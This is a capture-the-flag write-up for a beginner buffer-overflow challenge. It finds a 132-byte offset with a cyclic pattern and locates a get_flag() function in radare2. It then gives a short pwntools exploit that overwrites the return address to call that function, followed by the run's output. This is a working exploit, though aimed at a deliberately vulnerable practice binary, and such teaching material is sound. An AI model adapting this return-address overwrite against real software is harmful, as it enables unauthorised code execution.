Beginners Up Pwn Challenge - Break_In CTF

With gdb and pwntools cyclic patterns, we can find the offset to overflow as 132
```
Program received signal SIGSEGV, Segmentation fault. 
0x62616169 in ?? ()
gef➤  pattern offset 0x62616169
[+] Searching '0x62616169'
[+] Found at offset 132 (little-endian search) likely
```
I used radare2 to analyze the functions of the binary
```
[0x08048440]> afl                                                                                                                                     
<-----------------SNIP------------------>                                                                                                
0x080485a2    1 32           sym.get_flag                                                                                                             
0x080483f0    1 6            sym.imp.puts                                                                                                             
0x08048400    1 6            sym.imp.system                                                                                                           
0x08048654    1 20           sym._fini                                                                                                                
0x08048556    1 76           sym.initialize                                                                                                           
<-----------------SNIP------------------>
```
we can see get_flag() function. i disassembled it using the pdf command
```
[0x08048440]> pdf @sym.get_flag
/ (fcn) sym.get_flag 32
|   sym.get_flag ();
|           0x080485a2      55             push ebp
|           0x080485a3      89e5           mov ebp, esp
|           0x080485a5      6870860408     push str.Dont_use_gets_bruhh_:__here_is_ur_flag.. ; 0x8048670 ; "\nDont use gets bruhh :) here is ur flag.." ; const char *s
|           0x080485aa      e841feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485af      83c404         add esp, 4
|           0x080485b2      689a860408     push str.bin_cat_flag.txt   ; 0x804869a ; "/bin/cat flag.txt" ; const char *string
|           0x080485b7      e844feffff     call sym.imp.system         ; int system(const char *string)
|           0x080485bc      83c404         add esp, 4
|           0x080485bf      90             nop
|           0x080485c0      c9             leave
\           0x080485c1      c3             ret
```
So we can directly call the function to get the flag using this simple exploit
```
from pwn import *
expl = cyclic(132)
expl += p32(0x080485a2) # get_flag() address
print expl

# python begin.py | ./begin
overflow me --_--

Dont use gets bruhh :) here is ur flag..
/bin/cat: flag.txt: No such file or directory
[1]    4254 done                python begin.py | 
       4255 segmentation fault  ./begin
```
Run this against remote server to get the flag
